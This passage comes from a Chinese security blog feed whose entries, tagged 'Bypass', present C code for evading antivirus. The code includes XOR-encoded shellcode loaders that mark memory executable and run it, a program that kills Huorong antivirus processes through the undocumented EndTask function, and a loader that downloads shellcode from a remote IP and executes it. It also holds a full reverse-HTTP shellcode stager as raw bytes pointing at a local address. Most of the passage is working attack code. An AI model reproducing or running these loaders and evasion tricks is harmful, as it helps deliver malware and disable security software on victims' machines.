function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> buf[] = <span class="string">&quot;异或的shellcode&quot;</span>;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> shellcode[<span class="number">892</span>]; <span class="comment">//shellcode长度</span></span><br><span class="line">	<span class="type">int</span> len = <span class="keyword">sizeof</span>(shellcode) - <span class="number">1</span>;  <span class="comment">//从0开始算 所以-1</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; len; i++)  <span class="comment">//异或shellcode</span></span><br><span class="line">	&#123;</span><br><span class="line">		buf[i] ^= <span class="number">10</span>;</span><br><span class="line">		shellcode[i] = buf[i];</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">typedef</span> <span class="title function_">BOOL</span><span class="params">(WINAPI *pVirtualProtect)</span><span class="params">(LPVOID, DWORD, DWORD, PDWORD)</span>;</span><br><span class="line"></span><br><span class="line">	DWORD oldProtect = <span class="number">0</span>;</span><br><span class="line">	HMODULE hKernal32 = GetKernel32Addr(); <span class="comment">//kernal32Base</span></span><br><span class="line"></span><br><span class="line">	pVirtualProtect VirtualProtect = (pVirtualProtect)GetProcAddress(hKernal32, <span class="string">&quot;VirtualProtect&quot;</span>);<span class="comment">//得到VirtualProtect</span></span><br><span class="line"></span><br><span class="line">	VirtualProtect(shellcode, <span class="keyword">sizeof</span>(shellcode), PAGE_EXECUTE_READWRITE, &amp;oldProtect);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//VirtualProtect(&amp;shellcode, sizeof(shellcode), oldProtect, NULL);</span></span><br><span class="line">	HANDLE handle = CreateThread(<span class="number">0</span>,<span class="number">0</span>,shellcode, CREATE_SUSPENDED,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">	Sleep(<span class="number">15000</span>);</span><br><span class="line">	ResumeThread(handle);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Bypass</category>
      </categories>
      <tags>
        <tag>Bypass</tag>
      </tags>
  </entry>
  <entry>
    <title>Ring3Kill火绒</title>
    <url>/posts/3fe86fb6/</url>
    <content><![CDATA[<p>一般杀毒软件会对关键函数挂钩，火绒虽然没有对底层 api 进行挂钩，但是火绒通过 windows 回调来监控整个系统。</p>
<p>在任务管理器中可以看到火绒有三个进程</p>
<p><code>HipsDEaemon. exe </code>  后台守护进程</p>
<p><img src="/posts/3fe86fb6/1.png"></p>
<p><code>HipsMain. exe</code>  主界面<br><img src="/posts/3fe86fb6/2.png"></p>
<p><code>HipsTray. exe</code> 托盘程序<br><img src="/posts/3fe86fb6/3..png"><br>使用 penProcess 和 TerminateProcess 是无法将进程关闭的，火绒的系统回调会监控到 openprocess。但是可以通过一个未导出函数 EndTask 函数进行关闭，该函数并没有被其挂钩进行监控。<br>使用processhacker查看csrss.exe 看到HipsTray的权限为全部<br><img src="/posts/3fe86fb6/4.png"><br>如果把火绒的托盘程序杀掉后 守护程序会放行所以操作<br>不过该方法现在已经用不了了 只作为一种学习思路学习下<br><img src="/posts/3fe86fb6/5.png"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&quot;tlhelp32.h&quot;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">BOOL</span><span class="params">(WINAPI *pEndTask)</span><span class="params">(HWND hWnd, BOOL fShutDown, BOOL fForce)</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HWND <span class="title function_">GetXHandle</span><span class="params">(LPCWSTR procName)</span></span><br><span class="line">&#123;</span><br><span class="line">	DWORD iProcID = <span class="number">0</span>;</span><br><span class="line">	PROCESSENTRY32 pEntry = &#123; <span class="keyword">sizeof</span>(PROCESSENTRY32) &#125;;</span><br><span class="line"></span><br><span class="line">	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (hSnapshot != INVALID_HANDLE_VALUE)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (Process32First(hSnapshot, &amp;pEntry))</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">while</span> (Process32Next(hSnapshot, &amp;pEntry))</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">if</span> (lstrcmpi(procName, pEntry.szExeFile) == <span class="number">0</span>)</span><br><span class="line">				&#123;</span><br><span class="line">					iProcID = pEntry.th32ProcessID;</span><br><span class="line">					CloseHandle(hSnapshot);</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	HWND hwnd = GetTopWindow(<span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">while</span> (hwnd)</span><br><span class="line">	&#123;</span><br><span class="line">		DWORD pid = <span class="number">0</span>;</span><br><span class="line">		DWORD dwProcessId = GetWindowThreadProcessId(hwnd, &amp;pid);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (dwProcessId != <span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (pid == iProcID)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">return</span> hwnd;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		hwnd = GetNextWindow(hwnd, GW_HWNDNEXT);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, 16336);</span></span><br><span class="line">	<span class="comment">//TerminateProcess(hProcess, 0);</span></span><br><span class="line"></span><br><span class="line">	HMODULE hModule = LoadLibraryA(<span class="string">&quot;user32.dll&quot;</span>);</span><br><span class="line">	pEndTask endTask = (pEndTask)GetProcAddress(hModule, <span class="string">&quot;EndTask&quot;</span>);</span><br><span class="line">	HWND hwnd = GetXHandle(<span class="string">L&quot;HipsTray.exe&quot;</span>);</span><br><span class="line">	endTask(hwnd, FALSE, <span class="number">1</span>);</span><br><span class="line">	hwnd = GetXHandle(<span class="string">L&quot;HipsMain.exe&quot;</span>);</span><br><span class="line">	endTask(hwnd, FALSE, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>csrss.exe</p>
<h4 id="References"><a href="#References" class="headerlink" title="References"></a>References</h4><p><a href="https://czm23333.github.io/2021/11/07/C-Windows-%E7%A6%81%E7%94%A8%E7%81%AB%E7%BB%92%E4%B8%BB%E5%8A%A8%E9%98%B2%E5%BE%A1/">https://czm23333.github.io/2021/11/07/C-Windows-%E7%A6%81%E7%94%A8%E7%81%AB%E7%BB%92%E4%B8%BB%E5%8A%A8%E9%98%B2%E5%BE%A1/</a></p>
]]></content>
      <categories>
        <category>Bypass</category>
      </categories>
      <tags>
        <tag>Bypass</tag>
      </tags>
  </entry>
  <entry>
    <title>Shellcode远程加载</title>
    <url>/posts/b8f6edd1/</url>
    <content><![CDATA[<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;WinInet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;WinInet.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> * <span class="title function_">GetUrlPage</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *URL, <span class="type">const</span> <span class="type">char</span> *SubPath)</span></span><br><span class="line">&#123;</span><br><span class="line">	HINTERNET hInternet, hConnect, hRequest = <span class="literal">NULL</span>;</span><br><span class="line">	DWORD dwOpenRequestFlags, dwRet = <span class="number">0</span>;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> *pResponseHeaderIInfo = <span class="literal">NULL</span>;</span><br><span class="line">	DWORD dwResponseHeaderIInfoSize = <span class="number">2048</span>;</span><br><span class="line">	BYTE *pBuf = <span class="literal">NULL</span>;</span><br><span class="line">	DWORD dwBufSize = <span class="number">64</span> * <span class="number">2048</span>;</span><br><span class="line"></span><br><span class="line">	hInternet = InternetOpenA(<span class="string">&quot;WinInetGet/0.1&quot;</span>, INTERNET_OPEN_TYPE_PRECONFIG, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">	hConnect = InternetConnectA(hInternet, URL, INTERNET_DEFAULT_HTTP_PORT, <span class="number">0</span>, <span class="number">0</span>, INTERNET_SERVICE_HTTP, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (<span class="literal">NULL</span> == hConnect)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	dwOpenRequestFlags = INTERNET_FLAG_IGNORE_REDIRECT_TO_HTTP | INTERNET_FLAG_KEEP_CONNECTION |</span><br><span class="line">		INTERNET_FLAG_NO_AUTH | INTERNET_FLAG_NO_COOKIES | INTERNET_FLAG_NO_UI | INTERNET_FLAG_RELOAD;</span><br><span class="line"></span><br><span class="line">	hRequest = HttpOpenRequestA(hConnect, <span class="string">&quot;GET&quot;</span>, SubPath, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, dwOpenRequestFlags, <span class="number">0</span>);</span><br><span class="line">	HttpSendRequest(hRequest, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	pResponseHeaderIInfo = new <span class="type">unsigned</span> <span class="type">char</span>[dwResponseHeaderIInfoSize];</span><br><span class="line">	RtlZeroMemory(pResponseHeaderIInfo, dwResponseHeaderIInfoSize);</span><br><span class="line">	HttpQueryInfo(hRequest, HTTP_QUERY_RAW_HEADERS_CRLF, pResponseHeaderIInfo, &amp;dwResponseHeaderIInfoSize, <span class="literal">NULL</span>);</span><br><span class="line">	pBuf = new BYTE[dwBufSize];</span><br><span class="line"></span><br><span class="line">	RtlZeroMemory(pBuf, dwBufSize);</span><br><span class="line">	InternetReadFile(hRequest, pBuf, dwBufSize, &amp;dwRet);</span><br><span class="line">	<span class="keyword">return</span> (<span class="type">char</span> *)pBuf;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">char</span> *shellcode = GetUrlPage(<span class="string">&quot;ip地址&quot;</span>, <span class="string">&quot;/shellcode文件路径&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%s \n&quot;</span>, shellcode);</span><br><span class="line">	<span class="type">int</span> shellcode_length = <span class="built_in">strlen</span>(shellcode);</span><br><span class="line"></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span>* value = (<span class="type">unsigned</span> <span class="type">char</span>*)<span class="built_in">calloc</span>(shellcode_length / <span class="number">2</span>, <span class="keyword">sizeof</span>(<span class="type">unsigned</span> <span class="type">char</span>));</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">size_t</span> count = <span class="number">0</span>; count &lt; shellcode_length / <span class="number">2</span>; count++) &#123;</span><br><span class="line">		sscanf_s(shellcode, <span class="string">&quot;%2hhx&quot;</span>, &amp;value[count]);</span><br><span class="line">		shellcode += <span class="number">2</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="type">void</span> *exec = VirtualAlloc(<span class="number">0</span>, shellcode_length / <span class="number">2</span>, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">	<span class="built_in">memcpy</span>(exec, value, shellcode_length / <span class="number">2</span>);</span><br><span class="line">	((<span class="type">void</span>(*)())exec)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Bypass</category>
      </categories>
      <tags>
        <tag>Bypass</tag>
      </tags>
  </entry>
  <entry>
    <title>Shellcode异或</title>
    <url>/posts/346bf539/</url>
    <content><![CDATA[<p>通过 shellcode 变形掩盖其特征以绕过静态查杀</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//shellcode xorencode</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> buf[] = <span class="string">&quot;\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xeb\x86\x5d\x68\x6e\x65\x74\x00\x68\x77\x69\x6e\x69\x54\x68\x4c\x77\x26\x07\xff\xd5\x31\xff\x57\x57\x57\x57\x57\x68\x3a\x56\x79\xa7\xff\xd5\xe9\x84\x00\x00\x00\x5b\x31\xc9\x51\x51\x6a\x03\x51\x51\x68\x50\x00\x00\x00\x53\x50\x68\x57\x89\x9f\xc6\xff\xd5\xeb\x70\x5b\x31\xd2\x52\x68\x00\x02\x40\x84\x52\x52\x52\x53\x52\x50\x68\xeb\x55\x2e\x3b\xff\xd5\x89\xc6\x83\xc3\x50\x31\xff\x57\x57\x6a\xff\x53\x56\x68\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x0f\x84\xc3\x01\x00\x00\x31\xff\x85\xf6\x74\x04\x89\xf9\xeb\x09\x68\xaa\xc5\xe2\x5d\xff\xd5\x89\xc1\x68\x45\x21\x5e\x31\xff\xd5\x31\xff\x57\x6a\x07\x51\x56\x50\x68\xb7\x57\xe0\x0b\xff\xd5\xbf\x00\x2f\x00\x00\x39\xc7\x74\xb7\x31\xff\xe9\x91\x01\x00\x00\xe9\xc9\x01\x00\x00\xe8\x8b\xff\xff\xff\x44\x6f\x67\x43\x73\x44\x6f\x67\x43\x73\x2e\x6a\x73\x00\xce\x32\x3f\xe1\xbc\x7e\xdf\x16\xc5\xec\xd3\x08\xa5\xa9\xfd\xe8\x0c\x62\x21\x9e\x58\x71\xdb\xc4\x1c\xb5\xb7\x6a\x51\x66\x5b\x16\x92\xe3\x50\x3e\xb9\x43\x9e\xab\xc4\xa6\x36\x6c\x68\xaa\x2a\x9c\xe8\xcd\x32\xc3\x22\x78\x77\x17\xb0\xb6\xae\x7d\x2c\xbb\x0c\x04\x0e\x00\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30\x20\x28\x63\x6f\x6d\x70\x61\x74\x69\x62\x6c\x65\x3b\x20\x4d\x53\x49\x45\x20\x39\x2e\x30\x3b\x20\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x36\x2e\x31\x3b\x20\x57\x4f\x57\x36\x34\x3b\x20\x54\x72\x69\x64\x65\x6e\x74\x2f\x35\x2e\x30\x29\x0d\x0a\x00\x99\xc4\xdc\xc9\x44\xd2\x8a\xbf\x32\xa7\x06\x20\x29\x57\x58\x03\x21\xae\xab\x53\x2b\x60\xe6\x68\xcd\xcb\xc0\xee\x23\xb5\x0b\xa0\xa7\xf0\x61\xec\x55\x34\x3e\x5c\xaa\xe3\x9f\xb0\x6c\xa8\xd3\x05\xfd\xb4\x9b\xad\xed\x36\x4b\xee\x9d\xec\xfa\x18\x6d\xf1\x33\xc7\x88\x3a\x64\x77\x98\x98\x26\x89\xcb\xa9\x51\x39\xe8\x50\xa5\xba\xaf\xe4\x9b\x2f\x51\x99\x44\xac\x5f\xcf\xbc\x8a\xac\x06\xa7\x59\x1a\xf4\xfd\xc7\x34\xe7\xdc\xd0\xd6\x38\x64\x53\xbc\xea\x6e\x75\xcc\x87\x50\x99\xee\x5a\xaa\x10\xf0\x75\x16\x75\xe5\x80\x10\xe3\xb6\x7f\xe6\x2f\xc5\xcb\x5c\x2c\x6b\xbb\xb4\x73\x90\x9e\x4a\x7f\xef\x8a\xe0\x51\x25\x71\x00\x14\xdd\x20\x6d\xda\x86\x08\xef\x90\x83\x32\x76\xb5\xf4\xcc\xdd\x4f\x0d\x7e\xb2\xb9\xbb\x9d\x62\x2b\xc7\xfe\xf8\xdb\xe3\x57\x6c\x1a\xe8\x36\x08\x82\x97\xd2\xde\x3e\x53\x38\xb5\xb1\x19\xb3\x83\xe9\x39\xce\x06\xd5\x8f\x5b\x56\xc3\xdf\xa4\xfa\xda\xc8\xcf\x31\x63\x5b\x03\x00\x68\xf0\xb5\xa2\x56\xff\xd5\x6a\x40\x68\x00\x10\x00\x00\x68\x00\x00\x40\x00\x57\x68\x58\xa4\x53\xe5\xff\xd5\x93\xb9\x00\x00\x00\x00\x01\xd9\x51\x53\x89\xe7\x57\x68\x00\x20\x00\x00\x53\x56\x68\x12\x96\x89\xe2\xff\xd5\x85\xc0\x74\xc6\x8b\x07\x01\xc3\x85\xc0\x75\xe5\x58\xc3\xe8\xa9\xfd\xff\xff\x31\x39\x32\x2e\x31\x36\x38\x2e\x31\x38\x31\x2e\x31\x00\x05\xf5\xe1\x00&quot;</span>;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> key1 = <span class="number">50</span>;</span><br><span class="line">	<span class="type">int</span> key2 = <span class="number">66</span>;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> enShellCode[<span class="number">892</span>];</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> deShellCode[<span class="number">892</span>];</span><br><span class="line">	<span class="type">int</span> nLen = <span class="keyword">sizeof</span>(buf) - <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; nLen; i++)</span><br><span class="line">	&#123;  </span><br><span class="line">		enShellCode[i] = buf[i] ^ key1;</span><br><span class="line">		enShellCode[i] = buf[i] ^ key2;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;\\x%02x&quot;</span>, enShellCode[i]);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;-----------------------------------\n&quot;</span>);  </span><br><span class="line">	</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; nLen; i++)</span><br><span class="line">	&#123;    </span><br><span class="line">		deShellCode[i] = enShellCode[i] ^ key1;</span><br><span class="line">		deShellCode[i] = enShellCode[i] ^ key2;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;\\x%02x&quot;</span>, deShellCode[i]);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span>  <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> buf[] = <span class="string">&quot;\xbe\xaa\xcb\x42\x42\x42\x22\xcb\xa7\x73\x90\x26\xc9\x10\x72\xc9\x10\x4e\xc9\x10\x56\xc9\x30\x6a\x4d\xf5\x08\x64\x73\xbd\x73\x82\xee\x7e\x23\x3e\x40\x6e\x62\x83\x8d\x4f\x43\x85\xa0\xb2\x10\x15\xc9\x10\x52\xc9\x00\x7e\x43\x92\xc9\x02\x3a\xc7\x82\x36\x08\x43\x92\x12\xc9\x0a\x5a\xc9\x1a\x62\x43\x91\xa1\x7e\x0b\xc9\x76\xc9\x43\x94\x73\xbd\x73\x82\xee\x83\x8d\x4f\x43\x85\x7a\xa2\x37\xb6\x41\x3f\xba\x79\x3f\x66\x37\xa0\x1a\xc9\x1a\x66\x43\x91\x24\xc9\x4e\x09\xc9\x1a\x5e\x43\x91\xc9\x46\xc9\x43\x92\xcb\x06\x66\x66\x19\x19\x23\x1b\x18\x13\xbd\xa2\x1a\x1d\x18\xc9\x50\xa9\xc4\x1f\x2a\x2c\x27\x36\x42\x2a\x35\x2b\x2c\x2b\x16\x2a\x0e\x35\x64\x45\xbd\x97\x73\xbd\x15\x15\x15\x15\x15\x2a\x78\x14\x3b\xe5\xbd\x97\xab\xc6\x42\x42\x42\x19\x73\x8b\x13\x13\x28\x41\x13\x13\x2a\x12\x42\x42\x42\x11\x12\x2a\x15\xcb\xdd\x84\xbd\x97\xa9\x32\x19\x73\x90\x10\x2a\x42\x40\x02\xc6\x10\x10\x10\x11\x10\x12\x2a\xa9\x17\x6c\x79\xbd\x97\xcb\x84\xc1\x81\x12\x73\xbd\x15\x15\x28\xbd\x11\x14\x2a\x6f\x44\x5a\x39\xbd\x97\xc7\x82\x4d\xc6\x81\x43\x42\x42\x73\xbd\xc7\xb4\x36\x46\xcb\xbb\xa9\x4b\x2a\xe8\x87\xa0\x1f\xbd\x97\xcb\x83\x2a\x07\x63\x1c\x73\xbd\x97\x73\xbd\x15\x28\x45\x13\x14\x12\x2a\xf5\x15\xa2\x49\xbd\x97\xfd\x42\x6d\x42\x42\x7b\x85\x36\xf5\x73\xbd\xab\xd3\x43\x42\x42\xab\x8b\x43\x42\x42\xaa\xc9\xbd\xbd\xbd\x06\x2d\x25\x01\x31\x06\x2d\x25\x01\x31\x6c\x28\x31\x42\x8c\x70\x7d\xa3\xfe\x3c\x9d\x54\x87\xae\x91\x4a\xe7\xeb\xbf\xaa\x4e\x20\x63\xdc\x1a\x33\x99\x86\x5e\xf7\xf5\x28\x13\x24\x19\x54\xd0\xa1\x12\x7c\xfb\x01\xdc\xe9\x86\xe4\x74\x2e\x2a\xe8\x68\xde\xaa\x8f\x70\x81\x60\x3a\x35\x55\xf2\xf4\xec\x3f\x6e\xf9\x4e\x46\x4c\x42\x17\x31\x27\x30\x6f\x03\x25\x27\x2c\x36\x78\x62\x0f\x2d\x38\x2b\x2e\x2e\x23\x6d\x77\x6c\x72\x62\x6a\x21\x2d\x2f\x32\x23\x36\x2b\x20\x2e\x27\x79\x62\x0f\x11\x0b\x07\x62\x7b\x6c\x72\x79\x62\x15\x2b\x2c\x26\x2d\x35\x31\x62\x0c\x16\x62\x74\x6c\x73\x79\x62\x15\x0d\x15\x74\x76\x79\x62\x16\x30\x2b\x26\x27\x2c\x36\x6d\x77\x6c\x72\x6b\x4f\x48\x42\xdb\x86\x9e\x8b\x06\x90\xc8\xfd\x70\xe5\x44\x62\x6b\x15\x1a\x41\x63\xec\xe9\x11\x69\x22\xa4\x2a\x8f\x89\x82\xac\x61\xf7\x49\xe2\xe5\xb2\x23\xae\x17\x76\x7c\x1e\xe8\xa1\xdd\xf2\x2e\xea\x91\x47\xbf\xf6\xd9\xef\xaf\x74\x09\xac\xdf\xae\xb8\x5a\x2f\xb3\x71\x85\xca\x78\x26\x35\xda\xda\x64\xcb\x89\xeb\x13\x7b\xaa\x12\xe7\xf8\xed\xa6\xd9\x6d\x13\xdb\x06\xee\x1d\x8d\xfe\xc8\xee\x44\xe5\x1b\x58\xb6\xbf\x85\x76\xa5\x9e\x92\x94\x7a\x26\x11\xfe\xa8\x2c\x37\x8e\xc5\x12\xdb\xac\x18\xe8\x52\xb2\x37\x54\x37\xa7\xc2\x52\xa1\xf4\x3d\xa4\x6d\x87\x89\x1e\x6e\x29\xf9\xf6\x31\xd2\xdc\x08\x3d\xad\xc8\xa2\x13\x67\x33\x42\x56\x9f\x62\x2f\x98\xc4\x4a\xad\xd2\xc1\x70\x34\xf7\xb6\x8e\x9f\x0d\x4f\x3c\xf0\xfb\xf9\xdf\x20\x69\x85\xbc\xba\x99\xa1\x15\x2e\x58\xaa\x74\x4a\xc0\xd5\x90\x9c\x7c\x11\x7a\xf7\xf3\x5b\xf1\xc1\xab\x7b\x8c\x44\x97\xcd\x19\x14\x81\x9d\xe6\xb8\x98\x8a\x8d\x73\x21\x19\x41\x42\x2a\xb2\xf7\xe0\x14\xbd\x97\x28\x02\x2a\x42\x52\x42\x42\x2a\x42\x42\x02\x42\x15\x2a\x1a\xe6\x11\xa7\xbd\x97\xd1\xfb\x42\x42\x42\x42\x43\x9b\x13\x11\xcb\xa5\x15\x2a\x42\x62\x42\x42\x11\x14\x2a\x50\xd4\xcb\xa0\xbd\x97\xc7\x82\x36\x84\xc9\x45\x43\x81\xc7\x82\x37\xa7\x1a\x81\xaa\xeb\xbf\xbd\xbd\x73\x7b\x70\x6c\x73\x74\x7a\x6c\x73\x7a\x73\x6c\x73\x42\x47\xb7\xa3\x42&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> shellcode[<span class="number">892</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">//进行异或</span></span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> len = <span class="keyword">sizeof</span>(buf) - <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++)</span><br><span class="line"></span><br><span class="line">  &#123;</span><br><span class="line">    buf[i] ^= <span class="number">66</span>;</span><br><span class="line">    shellcode[i] = buf[i];</span><br><span class="line">    <span class="comment">//printf(&quot;\\x%02x&quot;, shellcode[i]);</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  DWORD temp;</span><br><span class="line">  <span class="comment">//使用VirtualProtect 修改内存页的属性 改为可执行权限</span></span><br><span class="line">  VirtualProtect(shellcode, <span class="keyword">sizeof</span> shellcode, PAGE_EXECUTE, &amp;temp);</span><br><span class="line">  ((<span class="type">void</span>(*)())shellcode)();</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>Shellcode反转</title>
    <url>/posts/e42a1137/</url>
    <content><![CDATA[<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>(disable:4996);</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;	</span><br><span class="line">	</span><br><span class="line">	<span class="type">char</span> *str = <span class="string">&quot;shellcode&quot;</span>;  </span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> char_in_hex;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> iterations = <span class="built_in">strlen</span>(str);</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> memory_allocation = <span class="built_in">strlen</span>(str) / <span class="number">2</span>;</span><br><span class="line">	  </span><br><span class="line">	<span class="type">char</span>* temp = (<span class="type">char</span>*)VirtualAlloc(<span class="number">0</span>, memory_allocation, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line">	</span><br><span class="line">	<span class="type">int</span> p = <span class="number">0</span>;  </span><br><span class="line">	</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="built_in">strlen</span>(str) - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">	&#123;</span><br><span class="line">		temp[p++] = str[i];</span><br><span class="line">	&#125;</span><br><span class="line">	 </span><br><span class="line"></span><br><span class="line">	<span class="type">char</span>* shellcode = (<span class="type">char</span>*)temp;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; iterations - <span class="number">1</span>; i++) &#123;</span><br><span class="line">		<span class="built_in">sscanf</span>(shellcode + <span class="number">2</span> * i, <span 